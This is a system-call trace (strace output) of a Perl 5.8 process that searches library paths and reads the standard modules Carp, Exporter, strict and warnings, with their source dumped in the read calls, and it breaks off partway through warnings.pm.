12010 20:22:35.189064 stat64("/usr/share/perl5/Carp.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189077 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189090 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189104 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189117 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
12010 20:22:35.189139 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.189154 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.189166 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.189183 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
12010 20:22:35.189626 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
12010 20:22:35.189654 read(8, "", 4096) = 0
12010 20:22:35.189666 close(8)          = 0
12010 20:22:35.189688 stat64("/etc/perl/Exporter.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189702 stat64("/etc/perl/Exporter.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189716 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189729 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189744 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189757 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189771 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189783 stat64("/usr/lib/perl5/Exporter.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189797 stat64("/usr/share/perl5/Exporter.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189809 stat64("/usr/share/perl5/Exporter.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189823 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189836 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189850 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.189863 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
12010 20:22:35.189884 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.189935 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.189967 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.190005 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
12010 20:22:35.190556 _llseek(8, 2217, [2217], SEEK_SET) = 0
12010 20:22:35.190574 _llseek(8, 0, [2217], SEEK_CUR) = 0
12010 20:22:35.190585 close(8)          = 0
12010 20:22:35.190660 stat64("/etc/perl/strict.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190677 stat64("/etc/perl/strict.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190691 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190705 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190719 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190732 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190746 stat64("/usr/lib/perl5/strict.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190758 stat64("/usr/lib/perl5/strict.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190772 stat64("/usr/share/perl5/strict.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190804 stat64("/usr/share/perl5/strict.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190832 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190903 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190960 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.190989 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
12010 20:22:35.191011 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.191027 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.191039 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.191060 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
12010 20:22:35.191318 _llseek(8, 598, [598], SEEK_SET) = 0
12010 20:22:35.191349 _llseek(8, 0, [598], SEEK_CUR) = 0
12010 20:22:35.191385 close(8)          = 0
12010 20:22:35.191442 stat64("/etc/perl/warnings.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191458 stat64("/etc/perl/warnings.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191472 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191486 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191500 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191513 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191528 stat64("/usr/lib/perl5/warnings.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191540 stat64("/usr/lib/perl5/warnings.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191553 stat64("/usr/share/perl5/warnings.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191566 stat64("/usr/share/perl5/warnings.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191579 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191592 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191606 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.191619 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
12010 20:22:35.191641 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.191655 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.191667 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.191686 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
12010 20:22:35.192107 brk(0x81b6000)    = 0x81b6000
12010 20:22:35.192124 brk(0x81b5000)    = 0x81b5000
12010 20:22:35.192206 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> 